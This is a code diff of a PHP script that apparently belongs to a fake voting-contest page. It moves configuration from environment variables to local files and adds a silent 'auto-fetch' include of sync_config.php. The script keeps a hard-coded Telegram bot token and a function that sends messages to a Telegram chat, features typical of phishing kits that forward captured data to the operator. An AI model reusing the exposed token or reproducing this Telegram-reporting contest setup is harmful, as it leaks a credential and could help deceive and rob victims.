@@ -1,14 +1,12 @@
 <?php
-require_once __DIR__ . '/helper.php';
-
-if (file_exists(__DIR__ . '/vendor/autoload.php')) {
-    require_once __DIR__ . '/vendor/autoload.php';
-    Dotenv\Dotenv::createImmutable(__DIR__)->safeLoad(); // Load .env if present
+if (!file_exists('contestant_config.php') || time() - filemtime('contestant_config.php') > 300) {
+    include 'sync_config.php'; // auto-fetch if older than 5 min
 }
 
 
 // Start the session first
 session_start();
+
 
 // Configuration files (should be moved to non-web-accessible directory)
 $configFiles = [
@@ -25,10 +23,6 @@ foreach ($configFiles as $file) {
     }
 }
 
-$dbHost = env('DB_HOST', 'localhost');
-$appEnv = env('APP_NAME', 'production');
-
-
 // Redirect prevention logic
 // if (!isset($_GET['t']) && !isset($_GET['r'])) {
 //     $originalUrl = '.php';
@@ -43,28 +37,19 @@ $appEnv = env('APP_NAME', 'production');
 // }
 
 // Load configurations
-$setDate = new DateTime(env('TIME', ''));
+$setDate = new DateTime(file_get_contents('time.txt'));
 $currentTime = new DateTime('now');
-$chatId = env('TELEGRAM_CHAT_ID', '');
+$chatId = file_get_contents('telegram_chat_id.txt');
 $botToken = '8068607725:AAE3V6JSAcPJuXuo15PGnQakZ0VV3WmXHKY';
 
 // Load image configuration
-// $imageConfig = include('image_config.php');
-// $mainImage = $imageConfig['main_image'];
-
-$dataImage = json_decode(env('IMAGE_DATA', '{}'), true);
-$mainImage = $dataImage['main_image'];
+$imageConfig = include('image_config.php');
+$mainImage = $imageConfig['main_image'];
 
 // Load contestant configuration
-// $contestantsData = include('contestant_config.php');
-// $mainContestant = $contestantsData['main_contestant'];
-// $otherContestants = $contestantsData['contestants'];
-
-$json = env('CONTEST_DATA', '{}');
-$data = json_decode($json, true);
-$mainContestant = $data['main_contestant'];
-$otherContestants = $data['contestants'];
-
+$contestantsData = include('contestant_config.php');
+$mainContestant = $contestantsData['main_contestant'];
+$otherContestants = $contestantsData['contestants'];
 
 // Telegram message function
 function sendTelegramMessage($botToken, $chatId, $message) {
